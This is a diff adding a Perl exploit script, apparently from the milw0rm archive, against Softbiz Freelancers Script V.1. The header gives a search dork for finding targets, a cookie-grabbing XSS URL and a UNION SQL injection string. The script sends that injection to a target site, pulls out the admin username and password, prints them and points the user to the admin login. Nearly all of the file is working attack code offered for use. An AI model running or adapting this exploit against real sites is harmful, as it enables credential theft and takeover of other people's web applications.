@@ -1,0 +1,123 @@
+#!/usr/bin/perl
+#####################################################################################
+####                    Softbiz Freelancers Script V.1                           ####
+####             Multiple Remote Vulnerabilities (SQL Injection Exploit/XSS)     ####
+#####################################################################################
+#                                                                                   #
+#AUTHOR : IRCRASH (Dr.Crash)                                                        #
+#Script Download : http://www.softbizscripts.com/                                   #
+#DORK: "Search Projects" intitle:"The ultimate project website"                     #
+#Our English Forum : http://ircrash.com/english/                                    #
+#                                                                                   #
+#####################################################################################
+#                                   < XSS >                                         #
+#XSS Address : http://Sitename/signin.php?errmsg=<script>alert(document.cookie);</script>
+#                                                                                   #
+#####################################################################################
+#                                   < SQL >                                         #
+#SQL Address : search_form.php?sb_showresult=1&sb_protype=999999%20union/**/select/**/0,CoNcAt(0x4c6f67696e3a,sb_admin_name,0x3c686579206578706c6f69743e2050617373776f72643a,sb_pwd,0x3c686579206578706c6f69743e),2/**/from/**/sbprj_admin/*
+#                                                                                   #
+#####################################################################################
+#                         Our site : Http://IRCRASH.COM                             #
+#####################################################################################
+ 
+ 
+use LWP;
+use HTTP::Request;
+use Getopt::Long;
+ 
+ 
+sub header
+{
+print "
+****************************************************
+* Softbiz Freelancers Script Sql Injection exploit *
+****************************************************
+*AUTHOR : IRCRASH (Dr.Crash)                       *
+*Exploited by : Dr.Crash                           *
+*Our Site : IRCRASH.COM                            *
+****************************************************";
+}
+ 
+sub usage
+{
+  print "
+* Usage : perl $0 -url http://Sitename/
+****************************************************
+";
+}                                                                                  
+ 
+ 
+my %parameter = ();
+GetOptions(\%parameter, "url=s");
+ 
+$url = $parameter{"url"};
+ 
+if(!$url)
+{
+header();
+usage();
+exit;
+}
+ 
+if($url !~ /\//){$url = $url."/";}
+if($url !~ /http:\/\//){$url = "http://".$url;}
+ 
+if(!$cat){$cat = 2;}
+$bugfile = "/search_form.php?";
+$sqlinjection = "999999%20union/**/select/**/0,CoNcAt(0x4c6f67696e3a,sb_admin_name,0x3c686579206578706c6f69743e2050617373776f72643a,sb_pwd,0x3c686579206578706c6f69743e),2/**/from/**/sbprj_admin/*";
+$poststring = "sb_showresult=1&sb_protype=".$sqlinjection;
+ 
+ 
+ 
+sub Exploit()
+{
+$requestpage = $url.$bugfile;
+print "Requesting Page is ".$requestpage."\n";
+ 
+my $req  = HTTP::Request->new("POST",$requestpage);
+$ua = LWP::UserAgent->new;
+$ua->agent( 'Mozilla/5.0 Gecko/20061206 Firefox/1.5.0.9' );
+#$req->referer($url);
+$req->referer("http://IRCRASH.COM");
+$req->content_type('application/x-www-form-urlencoded');
+$contlen = length($poststring);
+$req->header("content-length" => $contlen);
+$req->content($poststring);
+ 
+$response = $ua->request($req);
+$content = $response->content;
+$header = $response->headers_as_string();
+ 
+#Debug Modus delete # at beginning of next line
+#print $content;
+ 
+@name = split(/Login:/,$content);
+$name = @name[1];
+@name = split(/<hey exploit>/,$name);
+$name = @name[0];
+ 
+@password = split(/Password:/,$content);
+$password = @password[1];
+@password = split(/<hey exploit>/,$password);
+$password = @password[0];
+ 
+if(!$name && !$password)
+{
+print "\n\n";
+print "!Exploit failed ! :( - Insert http:// in start of url address\n\n";
+exit;
+}
+ 
+print "Username: ".$name."\n";
+print "Password: " .$password."\n\n";
+print "You can login in .$url/admin/\n";
+print "Enjoy My friend .....\n";
+ 
+}
+ 
+#Starting;
+print "\n\nExploiting...\n";
+Exploit();
+
+# milw0rm.com [2007-11-25]
